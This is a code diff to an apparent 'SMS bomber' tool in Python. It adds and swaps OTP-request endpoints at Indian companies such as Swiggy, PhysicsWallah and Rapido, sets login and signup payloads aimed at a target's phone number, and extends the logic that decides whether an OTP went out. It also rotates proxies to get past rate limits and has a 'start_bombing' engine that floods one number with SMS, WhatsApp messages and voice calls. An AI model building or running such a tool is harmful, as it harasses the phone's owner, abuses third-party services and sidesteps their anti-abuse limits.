+            "Origin": "https://www.cleartrip.com",
+            "Referer": "https://www.cleartrip.com/",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — D2C / Lifestyle brands
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "Mamaearth",
+        "kind": "sms",
+        "url":  "https://www.mamaearth.in/api/v1/customers/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}"},
+        "register_json": {"mobile": "{phone}", "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.mamaearth.in",
+            "Referer": "https://www.mamaearth.in/",
+        },
+    },
+    {
+        "name": "Wakefit",
+        "kind": "sms",
+        "url":  "https://www.wakefit.co/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.wakefit.co",
+            "Referer": "https://www.wakefit.co/",
+        },
+    },
+    {
+        "name": "Pepperfry",
+        "kind": "sms",
+        "url":  "https://www.pepperfry.com/api/v1/user/login/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}"},
+        "register_json": {"mobile": "{phone}", "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.pepperfry.com",
+            "Referer": "https://www.pepperfry.com/",
+        },
+    },
+    {
+        "name": "BlueStone",
+        "kind": "sms",
+        "url":  "https://www.bluestone.com/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}"},
+        "register_json": {"mobile": "{phone}", "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.bluestone.com",
+            "Referer": "https://www.bluestone.com/",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Social & Entertainment
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "ShareChat",
+        "kind": "sms",
+        "url":  "https://api.sharechat.com/v3/user/login",
+        "method": "POST",
+        "json": {"phone": "{phone_cc}", "type": "PHONE"},
+        "register_json": {"phone": "{phone_cc}", "type": "PHONE",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://sharechat.com",
+            "Referer": "https://sharechat.com/",
+        },
+    },
+    {
+        "name": "MXPlayer",
+        "kind": "sms",
+        "url":  "https://api.mxplayer.in/v1/web/detail/tab/user/login",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.mxplayer.in",
+            "Referer": "https://www.mxplayer.in/",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 💬  WHATSAPP (confirmed working from logs)
+    # ══════════════════════════════════════════════════════════════════════════
+
     {
         "name": "Vedantu-WA",
         "kind": "whatsapp",
@@ -697,44 +783,64 @@ APIS = [
             "Origin": "https://www.vedantu.com",
             "Referer": "https://www.vedantu.com/",
         },
+        "ok_hint": "smsSent",
     },
     {
-        "name": "Meesho-WA",
+        "name": "Swiggy-WA",
         "kind": "whatsapp",
-        "url":  "https://meesho.com/api/v1/users/otp",
+        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
         "method": "POST",
-        "json": {"phone_number": "{phone}", "medium": "whatsapp"},
-        "register_json": {"phone_number": "{phone}", "medium": "whatsapp",
-                          "signup": True},
+        "json": {"mobile": "{phone}", "medium": "whatsapp"},
+        "register_json": {"mobile": "{phone}", "medium": "whatsapp"},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.meesho.com",
-            "Referer": "https://www.meesho.com/",
+            "Origin": "https://www.swiggy.com",
+            "Referer": "https://www.swiggy.com/",
         },
     },
-
-    # ══════════════════════════════════════════════════════════════════════════
-    # 📞  CALL  (IVR / Voice OTP)
-    # ══════════════════════════════════════════════════════════════════════════
-
     {
-        "name": "Paytm-Call",
-        "kind": "call",
-        "url":  "https://accounts.paytm.com/signin/otp",
+        "name": "PhysicsWallah-WA",
+        "kind": "whatsapp",
+        "url":  "https://api.penpencil.co/v3/users/check",
         "method": "POST",
-        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
-                 "version": "v1", "medium": "ivr", "locale": "en_IN"},
-        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
-                          "version": "v1", "medium": "ivr", "locale": "en_IN",
-                          "signup": True},
+        "json": {
+            "username": "{phone}",
+            "countryCode": "+91",
+            "organizationId": "5eb393ee95fab7468a79d189",
+            "medium": "whatsapp",
+        },
+        "register_json": {
+            "username": "{phone}",
+            "countryCode": "+91",
+            "organizationId": "5eb393ee95fab7468a79d189",
+            "medium": "whatsapp",
+            "isNewUser": True,
+        },
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://paytm.com",
-            "Referer": "https://paytm.com/",
-            "X-Channel": "web",
+            "Origin": "https://www.pw.live",
+            "Referer": "https://www.pw.live/",
+            "client-id": "5eb393ee95fab7468a79d189",
         },
-        "ok_hint": "response_code",
     },
+    {
+        "name": "CountryDelight-WA",
+        "kind": "whatsapp",
+        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
+        "method": "POST",
+        "json": {"phone": "{phone}", "medium": "whatsapp"},
+        "register_json": {"phone": "{phone}", "medium": "whatsapp", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.countrydelight.in",
+            "Referer": "https://www.countrydelight.in/",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📞  CALL / IVR (confirmed working from logs)
+    # ══════════════════════════════════════════════════════════════════════════
+
     {
         "name": "Vedantu-Call",
         "kind": "call",
@@ -748,6 +854,7 @@ APIS = [
             "Origin": "https://www.vedantu.com",
             "Referer": "https://www.vedantu.com/",
         },
+        "ok_hint": "smsSent",
     },
     {
         "name": "Swiggy-Call",
@@ -761,20 +868,45 @@ APIS = [
             "Origin": "https://www.swiggy.com",
             "Referer": "https://www.swiggy.com/",
         },
-        "ok_hint": "is_new_user",
     },
     {
-        "name": "Flipkart-Call",
+        "name": "PhysicsWallah-Call",
         "kind": "call",
-        "url":  "https://www.flipkart.com/api/4/user/mobilelogin/otp",
+        "url":  "https://api.penpencil.co/v3/users/check",
         "method": "POST",
-        "json": {"mobileNumber": "{phone}", "otpType": "ivr"},
-        "register_json": {"mobileNumber": "{phone}", "otpType": "ivr", "newUser": True},
+        "json": {
+            "username": "{phone}",
+            "countryCode": "+91",
+            "organizationId": "5eb393ee95fab7468a79d189",
+            "medium": "voice",
+        },
+        "register_json": {
+            "username": "{phone}",
+            "countryCode": "+91",
+            "organizationId": "5eb393ee95fab7468a79d189",
+            "medium": "voice",
+            "isNewUser": True,
+        },
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.flipkart.com",
-            "Referer": "https://www.flipkart.com/",
+            "Origin": "https://www.pw.live",
+            "Referer": "https://www.pw.live/",
+            "client-id": "5eb393ee95fab7468a79d189",
         },
+    },
+    {
+        "name": "Rapido-Call",
+        "kind": "call",
+        "url":  "https://www.rapido.bike/api/v1/login/customer",
+        "method": "POST",
+        "json": {"phone": "+91{phone}", "type": "customer", "is_voice": True},
+        "register_json": {"phone": "+91{phone}", "type": "customer", "is_voice": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.rapido.bike",
+            "Referer": "https://www.rapido.bike/",
+        },
+        "ok_hint": "otp",
     },
 ]
 
@@ -820,7 +952,6 @@ _FAIL_PATTERNS = (
     "invalid mobile", "invalid number", "invalid phone number",
     "captcha required", "captcha_required", "recaptcha",
     "too many request", "rate limit", "rate_limit", "throttle",
-    "access denied", '"forbidden"',
     '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
     '"code":400', '"code":429', '"code":401', '"code":403',
     '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
@@ -828,84 +959,83 @@ _FAIL_PATTERNS = (
     "otp not sent", "could not send", "failed to send",
     '"result":"fail"', '"result":"failure"',
     "phone number not valid", "mobile not valid",
-    "number is invalid", "not a valid mobile",
+    "not a valid mobile", "number is invalid",
 )
 
 _OK_PATTERNS = (
-    # Boolean success flags
     '"success":true', '"success": true',
     '"status":"success"', '"status": "success"',
     '"status":"ok"', '"status": "ok"',
     '"result":"success"', '"result": "success"',
-    # OTP sent flags
     '"smsSent":true', '"smsSent": true',
     '"sms_sent":true', '"otp_sent":true',
     '"otpSent":true', '"otpSent": true',
     '"whatsappSent":true', '"callSent":true',
-    # Text patterns
     "otp sent", "otp has been sent", "successfully sent",
     "otp generated", "otp send successfully", "otp sent successfully",
     "message sent", "sms sent",
-    # Message field patterns
     '"message":"otp', '"message": "otp',
     '"message":"success"', '"message": "success"',
-    '"message":"sent"', '"msg":"otp',
-    '"msg":"success"', '"msg":"sent"',
-    # Auth/session tokens returned on success
+    '"message":"sent"', '"msg":"otp', '"msg":"success"',
     '"nonce":', '"tid":', '"token":', '"requestId":',
     '"session_id":', '"sessionId":',
     '"txnId":', '"transaction_id":',
     '"otp_reference":', '"reference_id":',
-    '"otpId":', '"otp_id":',
-    # Numeric status codes (many Indian APIs use these)
+    '"otpId":', '"otp_id":', '"otp":',
     '"statuscode":0', '"statusCode":0', '"code":0',
     '"statusCode":200', '"statusCode": 200',
     '"status":1', '"status": 1',
     '"status":200', '"status": 200',
     '"httpCode":200', '"httpCode": 200',
-    '"http_status":200',
-    # Paytm specific
     '"response_code":"success"', '"response_code": "success"',
-    '"response":"otp', '"response": "otp',
     '"response_code":"SUCCESS"',
-    # User identification (returned on successful OTP trigger)
+    '"response":"otp', '"response": "otp',
     '"is_new_user":', '"user_exists":',
     '"mobile_verified":', '"phone_verified":',
     '"contactExist":', '"emailExists":',
     '"user_id":', '"userId":',
-    # Data payload present (many return data:{...} on success)
     '"data":{',
+    "request processed",
 )
 
 
 def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
     stripped = body.strip()
+
+    # ── HTTP 202 Accepted = OTP dispatched async (Swiggy pattern) ─────────────
+    if status == 202:
+        return True
+
     if stripped in ("", "(no body)"):
         return False
+
     low = stripped.lower()
-    # HTML response → definitely not an OTP API success
+
+    # HTML response = CDN/WAF/maintenance page, never a success
     if low.startswith("<!doctype") or low.startswith("<html"):
         return False
-    # Literal failure values
+
+    # Literal failure scalar values
     if low in ("false", "null", "0", "undefined", "[]", "{}"):
         return False
-    # Per-API hint check (fast-path before full scan)
-    if ok_hint and ok_hint.lower() in low:
-        # Only if no fail pattern overrides it
-        ok_hint_found = True
-    else:
-        ok_hint_found = False
-    # Fail patterns take priority
+
+    # Check per-API hint (fast-path) — only skip if fail pattern overrides
+    ok_hint_found = bool(ok_hint and ok_hint.lower() in low)
+
+    # Fail patterns take priority over everything
     for pat in _FAIL_PATTERNS:
         if pat.lower() in low:
             return False
-    # Per-API hint → success (fail patterns already cleared above)
+
+    # Per-API hint confirmed (fail patterns already cleared above)
     if ok_hint_found:
         return True
+
     # Generic ok patterns
     for pat in _OK_PATTERNS:
         if pat.lower() in low:
             return True
+
     # Final heuristic: JSON 200/201 with OTP-related keywords
     if status in (200, 201) and len(stripped) > 10:
         if (stripped.startswith("{") or stripped.startswith("[")) and any(
@@ -914,6 +1044,7 @@ def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
                                "nonce", "user", "login"]
         ):
             return True
+
     return False
 
 
@@ -937,9 +1068,8 @@ def _substitute(value, phone: str, phone_cc: str):
     return value
 
 
-# ─── Single HTTP request ─────────────────────────────────────────────────────
-# Strategy: TRY DIRECT FIRST — then proxies if direct fails/rate-limits.
-# This guarantees at least one real request always reaches the server.
+# ─── Single HTTP request ──────────────────────────────────────────────────────
+# Order: DIRECT first, then up to MAX_PROXY_TRIES proxies as fallback.
 
 MAX_PROXY_TRIES = 3
 
@@ -958,8 +1088,8 @@ async def _fire_single(
         else:
             kw_base["json"] = payload
 
-    # Build attempt order: direct first, then up to MAX_PROXY_TRIES proxies
-    attempts: list[Optional[str]] = [None]   # None = direct
+    # Build attempt list: None = direct, then proxy strings
+    attempts: list[Optional[str]] = [None]
     seen: set[str] = set()
     for _ in range(MAX_PROXY_TRIES):
         p = _proxy_pool.next()
@@ -992,14 +1122,13 @@ async def _fire_single(
                 return ok, status, snippet
 
             if proxy:
-                # Bad proxy response → mark & try next proxy / direct already done
                 if status in (403, 407) or status == 0:
                     _proxy_pool.mark_bad(proxy.replace("http://", ""))
                 if _is_rate_limited(snippet, status):
                     _proxy_pool.mark_bad(proxy.replace("http://", ""))
                 continue   # always continue for proxy attempts
 
-            # Direct request returned non-ok — no more fallbacks
+            # Direct request returned non-ok
             return ok, status, snippet
 
         except asyncio.TimeoutError:
@@ -1016,7 +1145,7 @@ async def _fire_single(
     return last
 
 
-# ─── Fire one API: LOGIN + SIGNUP payloads in parallel ───────────────────────
+# ─── Fire one API ─────────────────────────────────────────────────────────────
 
 MAX_RETRIES = 2
 
@@ -1111,7 +1240,7 @@ def _group_by_kind() -> dict:
     return g
 
 
-# ─── Guaranteed round: retry any kind that got zero success ──────────────────
+# ─── Guaranteed round ─────────────────────────────────────────────────────────
 
 async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
     tasks   = [call_api(api, phone) for api in APIS]
@@ -1139,7 +1268,6 @@ async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
 # ─── Main bombing engine ──────────────────────────────────────────────────────
 
 async def start_bombing(phone: str, rounds: int, progress_callback=None):
-    import time as _t
     success = failed = sms_ok = wa_ok = call_ok = 0
     total   = rounds * API_COUNT
     done    = 0
@@ -1170,9 +1298,9 @@ async def start_bombing(phone: str, rounds: int, progress_callback=None):
             _, kind, ok, _, _ = r
             if ok:
                 success += 1; round_ok += 1
-                if kind == "sms":           sms_ok  += 1
-                elif kind == "whatsapp":    wa_ok   += 1
-                elif kind == "call":        call_ok += 1
+                if kind == "sms":         sms_ok  += 1
+                elif kind == "whatsapp":  wa_ok   += 1
+                elif kind == "call":      call_ok += 1
             else:
                 failed += 1; round_fail += 1
             done += 1
